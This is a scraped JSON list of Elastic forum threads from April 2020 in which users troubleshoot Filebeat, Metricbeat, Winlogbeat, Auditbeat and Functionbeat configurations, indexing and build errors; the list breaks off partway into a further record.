[
  {
    "id": "39464b0e-dadb-448e-aa32-f5222528eeed",
    "url": "https://discuss.elastic.co/t/about-the-beats-category/1067",
    "title": "About the Beats category",
    "category": [
      "Beats"
    ],
    "author": "Leslie_Hawthorn",
    "date": "November 10, 2018, 11:37pm June 2, 2015, 12:11pm March 4, 2016, 8:12pm July 5, 2017, 9:49pm",
    "body": "Any questions regarding Beats, forwarders and shippers for various types of data.",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "1a5cca4e-9849-4ac2-8840-89d36615f56f",
    "url": "https://discuss.elastic.co/t/filebeat-does-not-insert-data-into-elasticsearch-using-ilm-node-default-index/229288",
    "title": "Filebeat does not insert data into elasticsearch using ILM (node default index)",
    "category": [
      "Beats",
      "Filebeat"
    ],
    "author": "Alon_Eldi",
    "date": "April 22, 2020, 2:51pm April 22, 2020, 8:30pm",
    "body": "Hi , We have filebeat agents which write data directly into elasticsearch cloud service. For some reason the filebeat is not writing the data into the index The filbeat use ILM policy : setup.ilm.enabled: auto setup.ilm.rollover_alias: \"data-prod\" setup.ilm.pattern: \"{now/d}-000001\" setup.ilm.policy_name: \"data-prod-%{[agent.version]}\" setup.ilm.check_exists: false setup.ilm.overwrite: true setup.ilm.policy_file: /etc/filebeat/index.json /etc/filebeat/index.json { \"policy\": { \"phases\": { \"hot\": { \"min_age\": \"0ms\", \"actions\": { \"rollover\": { \"max_age\": \"24h\", \"max_size\": \"50gb\", \"max_docs\": 100000000 }, \"set_priority\": { \"priority\": 100 } } }, \"delete\": { \"min_age\": \"61d\", \"actions\": { \"delete\": {} } } } } } the data-prod alias have 1 writing index . \"data-prod-2020.04.16-000600\" : { \"aliases\" : { \"data-prod\" : { \"is_write_index\" : true } } } I wrote to the alias from the filebeat machine successfully : curl -k -u elastic -X PUT \"https:///data-prod/_doc/1?pretty\" -H 'Content-Type: application/json' -d' { \"name\": \"John Doe\" }' So the filebeat agent can write to elasticsearch and to the correct index . I run filebeat in debug mode : filebeat -e -d \"*\" -c /etc/filebeat/filebeat.yml dont get any errors and output show correct values : 2020-04-22T13:10:56.509Z INFO [index-management] idxmgmt/std.go:178 Set output.elasticsearch.index to 'data-prod' as ILM is enabled. 2020-04-22T13:10:56.509Z INFO elasticsearch/client.go:170 Elasticsearch url: https://:443 Do I miss anything Thanks Alon",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "83dae27b-8586-45ac-bb24-2837a8fb5cd4",
    "url": "https://discuss.elastic.co/t/filebeat-multiline-pattern-from-abbbc-to-ac/229267",
    "title": "Filebeat multiline pattern from 'abbbc' to 'ac'",
    "category": [
      "Beats",
      "Filebeat"
    ],
    "author": "",
    "date": "April 22, 2020, 1:03pm April 22, 2020, 8:25pm",
    "body": "",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "850e5d82-5a19-44a0-9de7-795e1fb30b6b",
    "url": "https://discuss.elastic.co/t/metricbeat-kibana-dashboard-not-loading/229348",
    "title": "Metricbeat Kibana dashboard not loading",
    "category": [
      "Beats",
      "Metricbeat"
    ],
    "author": "Keevin_Ace_Viray",
    "date": "April 22, 2020, 7:54pm",
    "body": "Hi, I have setup Metricbeat(System module) -> Kafka -> Logstash -> Elasticsearch -> Kibana on our Linux local environment. I can see from the Discovery tab in Kibana that there is a lot of hits coming from Metricbeat, but once I loaded the generated Kibana dashboard for Metricbeat system module there are no data being loaded. Is there any additional config for this dashboard? Btw, my index is metricbeat-* image1837×806 110 KB",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "c7f2e830-78f3-4339-a959-3a8793beb29b",
    "url": "https://discuss.elastic.co/t/cannot-show-ping-because-icmp-rtt-us-no-value/226011",
    "title": "Cannot show ping because icmp.rtt.us no value",
    "category": [
      "Beats",
      "Heartbeat"
    ],
    "author": "",
    "date": "April 1, 2020, 1:21pm April 2, 2020, 9:09pm April 5, 2020, 10:39am April 5, 2020, 11:41am April 5, 2020, 11:43am April 5, 2020, 11:44am April 22, 2020, 7:32pm",
    "body": "",
    "website_area": "discuss",
    "replies": 7
  },
  {
    "id": "07aa8ea6-797b-4dad-95dd-83609add9618",
    "url": "https://discuss.elastic.co/t/beats-metricbeat-and-filebeat-doest-start-as-windows-service/228877",
    "title": "Beats (metricbeat and filebeat) does't start as windows service",
    "category": [
      "Beats"
    ],
    "author": "",
    "date": "April 20, 2020, 1:59pm April 21, 2020, 12:02pm April 22, 2020, 9:32am April 22, 2020, 10:33am April 22, 2020, 7:20pm",
    "body": "",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "7a51891b-c4cc-4f95-98a8-ecc4d363b72f",
    "url": "https://discuss.elastic.co/t/cloudwatch-logs-for-functionbeat-are-currently-being-sent-but-kibana-doesnt-show-them-on-the-logs-tab/229140",
    "title": "CloudWatch logs for functionbeat are currently being sent but Kibana doesn't show them on the \"Logs\" tab?!?!",
    "category": [
      "Beats",
      "Functionbeat"
    ],
    "author": "syost",
    "date": "April 21, 2020, 10:51pm April 21, 2020, 11:02pm April 21, 2020, 11:25pm April 21, 2020, 11:33pm April 22, 2020, 12:09am April 22, 2020, 12:12am April 22, 2020, 12:17am April 22, 2020, 12:46am April 22, 2020, 2:22am April 22, 2020, 8:52am April 22, 2020, 5:52pm April 22, 2020, 6:35pm",
    "body": "It appears that my Elasticseach + Kibana + Functionbeat + CloudWatch is setup correctly as far as the connections are working. However, when I generate logs into CloudWatch I never see them in the \"Logs\" page of Kibana. I've went in to Kibana->Logs->Settings and have set Log indices to FUNCTIONbeat-* but still nothing. My functionbeat.yml... functionbeat.provider.aws.endpoint: \"s3.us-gov-west-1.amazonaws.com\" functionbeat.provider.aws.deploy_bucket: \"syost\" functionbeat.provider.aws.functions: - name: cloudwatch enabled: true type: cloudwatch_logs description: \"lambda function for cloudwatch logs\" role: my_custom_role triggers: - log_group_name: /aws/lambda/syost-demo-test virtual_private_cloud: security_group_ids: [\"sd-xxxxx\"] subnet_ids: [\"subnet-xxxxx\"] setup.template.settings: index.number_of_shards: 1 setup.kibana: host: \"x.x.x.x:5601\" output.elasticsearch: hosts: [\"x.x.x.x:9200\"] username: \"elastic\" password: \"changeme\" processors: - add_host_metadata: ~ - add_cloud_metadata: ~",
    "website_area": "discuss",
    "replies": 12
  },
  {
    "id": "21167fe1-c33f-4104-9421-041e4458832b",
    "url": "https://discuss.elastic.co/t/problem-with-big-log-files/229325",
    "title": "Problem with big log files",
    "category": [
      "Beats",
      "Filebeat"
    ],
    "author": "Adryeh",
    "date": "April 22, 2020, 5:33pm",
    "body": "Hi to all! I am using filebeat version 6.8.8 and i have a problem. I need to bring deploy logs to kibana. Each file have 1-2k lines and for parsing in Logstash i need whole file content and there is my problem. If i use config like this my logs come not completely. For example i have file 2k lines, first doc comes in size of 500 lines, that is, the same file comes in parts and that fact give me a lot of problem with message parsing in logstash, because message is not full image850×344 29.7 KB If i don't use : clean_inactive: 24h ignore_older: 23h close_inactive: 22h close_eof: true then my registry file just overflows and i recieve ERROR every second: ERROR registrar/registrar.go:363 Writing of registry returned error: rename /var/lib/filebeat/registry.new /var/lib/filebeat/registry: no such file or directory. Continuing... I really hope u understood my problem, I would be grateful if you help)",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "73ec4e53-7b86-4011-85e7-d56fa8913dca",
    "url": "https://discuss.elastic.co/t/make-no-rule-to-make-target-setup-stop-custom-beat/229231",
    "title": "Make: *** No rule to make target `setup'. Stop.- Custom beat",
    "category": [
      "Beats",
      "Beats Developers"
    ],
    "author": "visasimbu",
    "date": "April 22, 2020, 5:28pm",
    "body": "I am able to create custom beat and build (mage build) as per the documentation. But I am getting below error while executing make setup. Documentation is here. [user@machineName test3]$ make setup make: *** No rule to make target `setup'. Stop. [user@machineName test3]$ pwd /home/user/elk/src/github.com/elastic/test3 Since this step is not successful, yml file is not created and resulted in execution error on beat. Am I missing something here ? [user@machineName test3]$ ./test3 -e -d \"*\" Exiting: error loading config file: stat test1.yml: no such file or directory My input while creating beat Enter the beat name [examplebeat]: test1 Enter your github name [your-github-name]: test2 Enter the beat path [github.com/test2/test1]: github.com/elastic/test3 Enter your full name [Firstname Lastname]: test4 Enter the beat type [beat]: beat Enter the github.com/elastic/beats revision [master]: master I have Makefile in /home/user/elk/src/github.com/elastic/test3. Content of the make file is below BEAT_NAME=test1 BEAT_PATH=github.com/elastic/test3 BEAT_GOPATH=$(firstword $(subst :, ,${GOPATH})) SYSTEM_TESTS=false TEST_ENVIRONMENT=false ES_BEATS_IMPORT_PATH=github.com/elastic/beats/v7 ES_BEATS?=vendor/${ES_BEATS_IMPORT_PATH} LIBBEAT_MAKEFILE=$(ES_BEATS)/libbeat/scripts/Makefile GOPACKAGES=$(shell go list ${BEAT_PATH}/... | grep -v /tools) GOBUILD_FLAGS=-i -ldflags \"-X ${ES_BEATS_IMPORT_PATH}/libbeat/version.buildTime=$(NOW) -X ${ES_BEATS_IMPORT_PATH}/libbeat/version.commit=$(COMMIT_ID)\" MAGE_IMPORT_PATH=github.com/magefile/mage NO_COLLECT=true CHECK_HEADERS_DISABLED=true # Path to the libbeat Makefile -include $(LIBBEAT_MAKEFILE) .PHONY: copy-vendor copy-vendor: mage vendorUpdate I have tried below make commands. Because i have seen same in MakeFile ($(GOPATH)/src/github.com/elastic/test3/vendor/github.com/elastic/beats/v7/libbeat/scripts) make release make snapshot Error Doing `require 'backports'` is deprecated and will not load any backport in the next major release. Require just the needed backports instead, or 'backports/latest'. >> Testing package contents --- FAIL: TestRPM (0.00s) --- FAIL: TestRPM/test3-8.0.0-SNAPSHOT-aarch64.rpm_config_file_permissions (0.00s) package_test.go:212: no config file found matching .*beat\\.yml$|apm-server\\.yml$ --- FAIL: TestRPM/test3-8.0.0-SNAPSHOT-aarch64.rpm_config_file_owner (0.00s) package_test.go:237: no config file found matching .*beat\\.yml$|apm-server\\.yml$ --- FAIL: TestRPM/test3-8.0.0-SNAPSHOT-i686.rpm_config_file_permissions (0.00s) package_test.go:212: no config file found matching .*beat\\.yml$|apm-server\\.yml$ --- FAIL: TestRPM/test3-8.0.0-SNAPSHOT-i686.rpm_config_file_owner (0.00s) package_test.go:237: no config file found matching .*beat\\.yml$|apm-server\\.yml$ --- FAIL: TestRPM/test3-8.0.0-SNAPSHOT-x86_64.rpm_config_file_permissions (0.00s) package_test.go:212: no config file found matching .*beat\\.yml$|apm-server\\.yml$ --- FAIL: TestRPM/test3-8.0.0-SNAPSHOT-x86_64.rpm_config_file_owner (0.00s) package_test.go:237: no config file found matching .*beat\\.yml$|apm-server\\.yml$ --- FAIL: TestRPM/test3-8.0.0-aarch64.rpm_config_file_permissions (0.00s) package_test.go:212: no config file found matching .*beat\\.yml$|apm-server\\.yml$ --- FAIL: TestRPM/test3-8.0.0-aarch64.rpm_config_file_owner (0.00s) package_test.go:237: no config file found matching .*beat\\.yml$|apm-server\\.yml$ --- FAIL: TestRPM/test3-8.0.0-i686.rpm_config_file_permissions (0.00s) package_test.go:212: no config file found matching .*beat\\.yml$|apm-server\\.yml$ --- FAIL: TestRPM/test3-8.0.0-i686.rpm_config_file_owner (0.00s) package_test.go:237: no config file found matching .*beat\\.yml$|apm-server\\.yml$ --- FAIL: TestRPM/test3-8.0.0-x86_64.rpm_config_file_permissions (0.00s) package_test.go:212: no config file found matching .*beat\\.yml$|apm-server\\.yml$ --- FAIL: TestRPM/test3-8.0.0-x86_64.rpm_config_file_owner (0.00s) package_test.go:237: no config file found matching .*beat\\.yml$|apm-server\\.yml$ --- FAIL: TestDeb (2.41s) --- FAIL: TestDeb/test3-8.0.0-SNAPSHOT-amd64.deb_config_file_permissions (0.00s) package_test.go:212: no config file found matching .*beat\\.yml$|apm-server\\.yml$ --- FAIL: TestDeb/test3-8.0.0-SNAPSHOT-amd64.deb_config_file_owner (0.00s) package_test.go:237: no config file found matching .*beat\\.yml$|apm-server\\.yml$ --- FAIL: TestDeb/test3-8.0.0-SNAPSHOT-arm64.deb_config_file_permissions (0.00s) package_test.go:212: no config file found matching .*beat\\.yml$|apm-server\\.yml$ --- FAIL: TestDeb/test3-8.0.0-SNAPSHOT-arm64.deb_config_file_owner (0.00s) package_test.go:237: no config file found matching .*beat\\.yml$|apm-server\\.yml$ --- FAIL: TestDeb/test3-8.0.0-SNAPSHOT-i386.deb_config_file_permissions (0.00s) package_test.go:212: no config file found matching .*beat\\.yml$|apm-server\\.yml$ --- FAIL: TestDeb/test3-8.0.0-SNAPSHOT-i386.deb_config_file_owner (0.00s) package_test.go:237: no config file found matching .*beat\\.yml$|apm-server\\.yml$ --- FAIL: TestDeb/test3-8.0.0-amd64.deb_config_file_permissions (0.00s) package_test.go:212: no config file found matching .*beat\\.yml$|apm-server\\.yml$ --- FAIL: TestDeb/test3-8.0.0-amd64.deb_config_file_owner (0.00s) package_test.go:237: no config file found matching .*beat\\.yml$|apm-server\\.yml$ --- FAIL: TestDeb/test3-8.0.0-arm64.deb_config_file_permissions (0.00s) package_test.go:212: no config file found matching .*beat\\.yml$|apm-server\\.yml$ --- FAIL: TestDeb/test3-8.0.0-arm64.deb_config_file_owner (0.00s) package_test.go:237: no config file found matching .*beat\\.yml$|apm-server\\.yml$ --- FAIL: TestDeb/test3-8.0.0-i386.deb_config_file_permissions (0.00s) package_test.go:212: no config file found matching .*beat\\.yml$|apm-server\\.yml$ --- FAIL: TestDeb/test3-8.0.0-i386.deb_config_file_owner (0.00s) package_test.go:237: no config file found matching .*beat\\.yml$|apm-server\\.yml$ --- FAIL: TestTar (3.04s) --- FAIL: TestTar/test3-8.0.0-SNAPSHOT-darwin-x86_64.tar.gz_config_file_permissions (0.00s) package_test.go:212: no config file found matching .*beat\\.yml$|apm-server\\.yml$ --- FAIL: TestTar/test3-8.0.0-SNAPSHOT-darwin-x86_64.tar.gz_config_file_owner (0.00s) package_test.go:237: no config file found matching .*beat\\.yml$|apm-server\\.yml$ --- FAIL: TestTar/test3-8.0.0-SNAPSHOT-linux-arm64.tar.gz_config_file_permissions (0.00s) package_test.go:212: no config file found matching .*beat\\.yml$|apm-server\\.yml$ --- FAIL: TestTar/test3-8.0.0-SNAPSHOT-linux-arm64.tar.gz_config_file_owner (0.00s) package_test.go:237: no config file found matching .*beat\\.yml$|apm-server\\.yml$ --- FAIL: TestTar/test3-8.0.0-SNAPSHOT-linux-x86.tar.gz_config_file_permissions (0.00s) package_test.go:212: no config file found matching .*beat\\.yml$|apm-server\\.yml$ --- FAIL: TestTar/test3-8.0.0-SNAPSHOT-linux-x86.tar.gz_config_file_owner (0.00s) package_test.go:237: no config file found matching .*beat\\.yml$|apm-server\\.yml$ --- FAIL: TestTar/test3-8.0.0-SNAPSHOT-linux-x86_64.tar.gz_config_file_permissions (0.00s) package_test.go:212: no config file found matching .*beat\\.yml$|apm-server\\.yml$ --- FAIL: TestTar/test3-8.0.0-SNAPSHOT-linux-x86_64.tar.gz_config_file_owner (0.00s) package_test.go:237: no config file found matching .*beat\\.yml$|apm-server\\.yml$ --- FAIL: TestTar/test3-8.0.0-darwin-x86_64.tar.gz_config_file_permissions (0.00s) package_test.go:212: no config file found matching .*beat\\.yml$|apm-server\\.yml$ --- FAIL: TestTar/test3-8.0.0-darwin-x86_64.tar.gz_config_file_owner (0.00s) package_test.go:237: no config file found matching .*beat\\.yml$|apm-server\\.yml$ --- FAIL: TestTar/test3-8.0.0-linux-arm64.tar.gz_config_file_permissions (0.00s) package_test.go:212: no config file found matching .*beat\\.yml$|apm-server\\.yml$ --- FAIL: TestTar/test3-8.0.0-linux-arm64.tar.gz_config_file_owner (0.00s) package_test.go:237: no config file found matching .*beat\\.yml$|apm-server\\.yml$ --- FAIL: TestTar/test3-8.0.0-linux-x86.tar.gz_config_file_permissions (0.00s) package_test.go:212: no config file found matching .*beat\\.yml$|apm-server\\.yml$ --- FAIL: TestTar/test3-8.0.0-linux-x86.tar.gz_config_file_owner (0.00s) package_test.go:237: no config file found matching .*beat\\.yml$|apm-server\\.yml$ --- FAIL: TestTar/test3-8.0.0-linux-x86_64.tar.gz_config_file_permissions (0.00s) package_test.go:212: no config file found matching .*beat\\.yml$|apm-server\\.yml$ --- FAIL: TestTar/test3-8.0.0-linux-x86_64.tar.gz_config_file_owner (0.00s) package_test.go:237: no config file found matching .*beat\\.yml$|apm-server\\.yml$ --- FAIL: Testuser (6.36s) --- FAIL: Testuser/test3-8.0.0-SNAPSHOT-linux-amd64.user.tar.gz_config_file_permissions (0.00s) package_test.go:212: no config file found matching .*beat\\.yml$|apm-server\\.yml$ --- FAIL: Testuser/test3-8.0.0-linux-amd64.user.tar.gz_config_file_permissions (0.00s) package_test.go:212: no config file found matching .*beat\\.yml$|apm-server\\.yml$ FAIL FAIL command-line-arguments 11.822s FAIL package ran for 2m53.153574155s Error: running \"go test /home/user/elk/src/github.com/elastic/test3/vendor/github.com/elastic/beats/v7/dev-tools/packaging/package_test.go -root-owner -files /home/user/elk/src/github.com/elastic/test3/build/distributions/*\" failed with exit code 1 make: *** [release] Error 1 [user@mymachine test3]$ These also throws me an error from test folder. Still not sure what i am missing here ? Can anyone give some help on this ? Note : I have python3 (Python 3.6.8) installed in my machine. I am using linux(RHEL 7) machine",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "268b1baa-be16-4715-8570-7cc531265d4e",
    "url": "https://discuss.elastic.co/t/auditbeat-and-dynamic-variables-is-it-real/229317",
    "title": "Auditbeat and dynamic variables - is it real?",
    "category": [
      "Beats",
      "Auditbeat"
    ],
    "author": "eee71",
    "date": "April 22, 2020, 4:40pm",
    "body": "Hello, can i use dynamic variables with auditbeat? When i am typing any command (auditd module) i have to check one variable to prepare right audit event + add this variable to event. For all executing commands. I lost all my variants: auditbeat reads systemd unit only when starts so it wont to help me (Environment option); gdb debugger not saving env variable (dont know why); write variable in auditbeat.yml or systemd unit + reload service before i execute any command - not good variant - no reliability + too overload (tons of service reloads). Any variants pls?",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "e0f03748-f7da-4551-819c-d288d38b909c",
    "url": "https://discuss.elastic.co/t/copy-winlog-user-name-if-present-to-user-name-if-missing/229313",
    "title": "Copy winlog.user.name (if present) to user.name (if missing)",
    "category": [
      "Beats",
      "Winlogbeat"
    ],
    "author": "_finack",
    "date": "April 22, 2020, 4:30pm",
    "body": "For normalization purposes, I would like to copy the contents of winlog.user.name to user.name if the former is present but the latter is not. I tried the following, but it does not work: - copy_fields: when: and: - equals.user.name: \"\" - not.equals.winlog.user.name: \"\" fields: - from: winlog.user.name to: user.name fail_on_error: false ignore_missing: true There are some Windows events where Winlogbeat parses out the username to winlog.user.name but leaves user.name blank. For example, event ID 4104 (PowerShell script block logging). Event ID 4104 is in the Microsoft-Windows-PowerShell/Operational and PowerShellCore/Operational log channels. I successfully set up a copy_fields processor in winlogbeat.yml for those log channels (see this topic), but it occurred to me that it's just better to check any event that has winlog.user.name but not user.name and have it perform the field copy.",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "2e15b550-a426-4947-9a5c-0d607a07f9a9",
    "url": "https://discuss.elastic.co/t/user-name-field-for-event-id-4104/229296",
    "title": "User.name field for event ID 4104",
    "category": [
      "Beats",
      "Winlogbeat"
    ],
    "author": "_finack",
    "date": "April 22, 2020, 3:27pm April 22, 2020, 4:10pm",
    "body": "I want event ID 4104 (PowerShell scriptblock logging) to populate the username in the user.name field. What is the best way to get the username to populate into the user.name field in Elasticsearch? Event IDs 4688 and 1 (process create native and Sysmon) put the username in the user.name field, but event ID 4104 does not. Instead has it in winlog.user.name. Meanwhile, event ID 4688 doesn't use winlog.user.name; event ID 1 uses both, but has SYSTEM in winlog.user.name. Basically I'm trying to do some normalization, but I'm very new to Elastic Stack and don't know the best way to accomplish this. Here is my winlogbeat.yml: winlogbeat: registry_file: C:/ProgramData/winlogbeat/.winlogbeat.yml shutdown_timeout: 5s event_logs: - name: ForwardedEvents forwarded: true tags: [\"forwarded\"] processors: - script: when.equals.winlog.channel: Security lang: javascript id: security file: ${path.home}/module/security/config/winlogbeat-security.js - script: when.equals.winlog.channel: Microsoft-Windows-Sysmon/Operational lang: javascript id: sysmon file: ${path.home}/module/sysmon/config/winlogbeat-sysmon.js - name: Application forwarded: false ignore_older: 72h level: critical, error, warning - name: System forwarded: false ignore_older: 72h level: critical, error, warning - name: Security forwarded: false processors: - script: lang: javascript id: security file: ${path.home}/module/security/config/winlogbeat-security.js setup: template: settings: index.number_of_shards: 1 overwrite: false enabled: true kibana: host: \"hostname:5601\" output: elasticsearch: hosts: [\"hostname:9200\"] protocol: \"http\" pipeline: geoip-info processors: - add_host_metadata: ~ - add_cloud_metadata: ~ - add_docker_metadata: ~ logging: level: info to_files: true json: false files: path: C:\\ProgramData\\winlogbeat\\logs name: winlogbeat.log rotateeverybytes: 10485760 # = 10MB keepfiles: 10 Here is an event 4104: Log Name: Microsoft-Windows-PowerShell/Operational Source: Microsoft-Windows-PowerShell Date: 4/22/2020 10:43:20 AM Event ID: 4104 Task Category: Execute a Remote Command Level: Verbose Keywords: None User: EXAMPLE\\username Computer: computer.example.com Description: Creating Scriptblock text (1 of 1): Get-Date -Format s ScriptBlock ID: 9da3668d-a501-42d2-aad6-05d03d8c7670 Path: Event Xml: <Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"> <System> <Provider Name=\"Microsoft-Windows-PowerShell\" Guid=\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\" /> <EventID>4104</EventID> <Version>1</Version> <Level>5</Level> <Task>2</Task> <Opcode>15</Opcode> <Keywords>0x0</Keywords> <TimeCreated SystemTime=\"2020-04-22T14:43:20.749036400Z\" /> <EventRecordID>151946</EventRecordID> <Correlation ActivityID=\"{858fb7f8-1422-0002-8dff-a1852214d601}\" /> <Execution ProcessID=\"27852\" ThreadID=\"22616\" /> <Channel>Microsoft-Windows-PowerShell/Operational</Channel> <Computer>computer.example.com</Computer> <Security UserID=\"S-1-5-21-1812345678-1234567350-2123456778-12345\" /> </System> <EventData> <Data Name=\"MessageNumber\">1</Data> <Data Name=\"MessageTotal\">1</Data> <Data Name=\"ScriptBlockText\">Get-Date -Format s</Data> <Data Name=\"ScriptBlockId\">9da3668d-a501-42d2-aad6-05d03d8c7670</Data> <Data Name=\"Path\"> </Data> </EventData> </Event> Here is the resulting indexed document: { \"_index\": \"winlogbeat-7.6.1-2020.04.21-000011\", \"_type\": \"_doc\", \"_id\": \"P7VZonEBbRXC_CHlvKUJ\", \"_score\": 1, \"_source\": { \"agent\": { \"hostname\": \"winlogserver\", \"id\": \"789dd088-2fa5-4754-bf7f-9953424d70d2\", \"ephemeral_id\": \"b3a91fc9-426b-469d-a4b3-fd9f7699b972\", \"type\": \"winlogbeat\", \"version\": \"7.6.1\" }, \"winlog\": { \"computer_name\": \"computer.example.com\", \"process\": { \"pid\": 27852, \"thread\": { \"id\": 22616 } }, \"channel\": \"Microsoft-Windows-PowerShell/Operational\", \"event_data\": { \"ScriptBlockId\": \"9da3668d-a501-42d2-aad6-05d03d8c7670\", \"MessageNumber\": \"1\", \"ScriptBlockText\": \"Get-Date -Format s\", \"MessageTotal\": \"1\" }, \"opcode\": \"On create calls\", \"version\": 1, \"record_id\": 151946, \"task\": \"Execute a Remote Command\", \"event_id\": 4104, \"provider_guid\": \"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\", \"activity_id\": \"{858fb7f8-1422-0002-8dff-a1852214d601}\", \"api\": \"wineventlog\", \"provider_name\": \"Microsoft-Windows-PowerShell\", \"user\": { \"identifier\": \"S-1-5-21-1812345678-1234567350-2123456778-12345\", \"domain\": \"EXAMPLE\", \"name\": \"username\", \"type\": \"User\" } }, \"log\": { \"level\": \"verbose\" }, \"message\": \"Creating Scriptblock text (1 of 1):\\nGet-Date -Format s\\n\\nScriptBlock ID: 9da3668d-a501-42d2-aad6-05d03d8c7670\\nPath: \", \"tags\": [ \"forwarded\" ], \"@timestamp\": \"2020-04-22T14:43:20.749Z\", \"ecs\": { \"version\": \"1.4.0\" }, \"host\": { \"hostname\": \"winlogserver\", \"os\": { \"build\": \"14393.2941\", \"kernel\": \"10.0.14393.2906 (rs1_release_inmarket.190401-1809)\", \"name\": \"Windows Server 2016 Standard\", \"family\": \"windows\", \"version\": \"10.0\", \"platform\": \"windows\" }, \"name\": \"computer.example.com\", \"id\": \"9e065853-7052-4895-8371-914b5f33df53\", \"architecture\": \"x86_64\" }, \"event\": { \"code\": 4104, \"provider\": \"Microsoft-Windows-PowerShell\", \"kind\": \"event\", \"created\": \"2020-04-22T14:45:21.749Z\", \"action\": \"Execute a Remote Command\" } }, \"fields\": { \"@timestamp\": [ \"2020-04-22T14:43:20.749Z\" ], \"event.created\": [ \"2020-04-22T14:45:21.749Z\" ] } }",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "42cf6da2-4c94-464c-8ba9-c9887db45697",
    "url": "https://discuss.elastic.co/t/mysql-module-configuration/229299",
    "title": "MySQL module: Configuration",
    "category": [
      "Beats",
      "Metricbeat"
    ],
    "author": "Md_Saidur_Rahman",
    "date": "April 22, 2020, 3:25pm",
    "body": "I've configured mysql moduld for MariaDB but didn't get any log in kibana dashboard. Configuration and Dashboards attached bellow: MySQL module configuration: module: mysql #metricsets: status galera_status period: 10s hosts: [\"tcp(10.88.220.200:3306)/\"] username: testuser password: testpass DB User: testuser Password: testpass Module Status: image918×167 9.07 KB MySQL Metrics Status: image1861×313 33.4 KB Is there anything missing or misconfiguration for MySQL module? Ref: https://www.elastic.co/guide/en/beats/metricbeat/7.2/metricbeat-module-mysql.html",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "cd5db363-0ba1-42d5-b0d8-c0c45b09d32a",
    "url": "https://discuss.elastic.co/t/auditbeat-file-integrity-doesnt-scans-shares-nor-mount-points/229291",
    "title": "Auditbeat file integrity doesn't scans shares nor mount points",
    "category": [
      "Beats"
    ],
    "author": "ormaman",
    "date": "April 22, 2020, 3:01pm",
    "body": "auditbeat file integrity doesn't scans shares nor mount points I tried to mount windows share to a windows machine with a auditbeat on it mapped to Z: The auditbeat does not recognizing changes there moreover i tried mounting the same share to a linux machine and the beat doesn't recognizing changes as well but when i restart the auditbeat on linux it detected the changes any ideas about windows and linux ?",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "1930bc7a-d1c5-4d08-8db2-d1276657247a",
    "url": "https://discuss.elastic.co/t/winlogbeat-event-action-for-4648/227919",
    "title": "Winlogbeat event.action for 4648",
    "category": [
      "Beats",
      "Winlogbeat"
    ],
    "author": "willemdh",
    "date": "April 14, 2020, 1:10pm April 22, 2020, 2:19pm",
    "body": "Hello, Using the Winlogbeat 'security ' module I noticed event.code 4648 does not (yet) have an event.action defined: var eventActionTypes = { \"4624\": \"logged-in\", \"4625\": \"logon-failed\", \"4634\": \"logged-out\", \"4672\": \"logged-in-special\", \"4688\": \"created-process\", \"4689\": \"exited-process\", 4624, 4625 and 4648 * 4624 - An account was successfully logged on. * 4625 - An account failed to log on. * 4648 - A logon was attempted using explicit credentials. The result is that the 4648 events have 'Logon' as event.action. The resulting histogram for event.action for logon events ooks like this: So what event.action should a 4648 get? special-logon-attempt ? Grtz Willem",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "f0101670-0a15-4159-9208-4565b57666c4",
    "url": "https://discuss.elastic.co/t/filebeat-on-windows-not-indexing-into-name-on-yml/225886",
    "title": "Filebeat on Windows not indexing into name on yml",
    "category": [
      "Beats",
      "Filebeat"
    ],
    "author": "math1324",
    "date": "March 31, 2020, 2:20pm April 22, 2020, 2:11pm",
    "body": "New to Beats, trying to figure out why Filebeat is sending data to ES in the default file index name filebeat--, when my yml configuration states that I want it to go into logs_server1: filebeat.inputs: - type: log enabled: true paths: - c:\\\\Users\\\\ ... logs_server1\\\\*.log processors: - decode_json_fields: fields: [\"message\"] target: \"\" - drop_fields: fields: [\"message\"] setup.template.enabled: false output.elasticsearch: hosts: [\"localhost:9200\"] index: \"logs_server1\" bulk_max_size: 25 logging.level: debug logging.selectors: [\"*\"] On the command line, I have tried .\\filebeat.exe setup --index-management -E setup.ilm.overwrite=true -c ..\\data\\filebeat3.yml and .\\filebeat.exe setup --index-management -E output.logstash.enabled=false -E 'output.elasticsearch.hosts=[\"localhost:9200\"]' -c ..\\data\\filebeat3.yml Thanks for any help.",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "26d2b120-1cad-470a-a7bb-95cfcfcbb502",
    "url": "https://discuss.elastic.co/t/winlogbeats-error-after-upgrade/227791",
    "title": "WInlogbeats Error after upgrade",
    "category": [
      "Beats",
      "Winlogbeat"
    ],
    "author": "Elk_huh",
    "date": "April 13, 2020, 3:20pm April 22, 2020, 2:06pm",
    "body": "Hi everyone i upgraded from 6.2.4 winlogbeats to 6.8 Same exact configs, same logstash conf file I now get this error any ideas ? [2020-04-13T11:18:30,467][WARN ][logstash.outputs.elasticsearch] Could not index event to Elasticsearch. {:status=>400, :action=>[\"index\", {:_id=>nil, :_index=>\"winevents-domain-controllers-2020.04.13\", :_type=>\"doc\", :routing=>nil}, #LogStash::Event:0x6d25b8b3], :response=>{\"index\"=>{\"_index\"=>\"winevents-domain-controllers-2020.04.13\", \"_type\"=>\"doc\", \"_id\"=>\"PtUedHEBacbM0UXs2o7Z\", \"status\"=>400, \"error\"=>{\"type\"=>\"mapper_parsing_exception\", \"reason\"=>\"failed to parse field [host] of type [keyword] in document with id 'PtUedHEBacbM0UXs2o7Z'\", \"caused_by\"=>{\"type\"=>\"illegal_state_exception\", \"reason\"=>\"Can't get text on a START_OBJECT at 1:978\"}}}}}",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "dd63b1d0-714f-48d4-b2fc-48e8b67d612d",
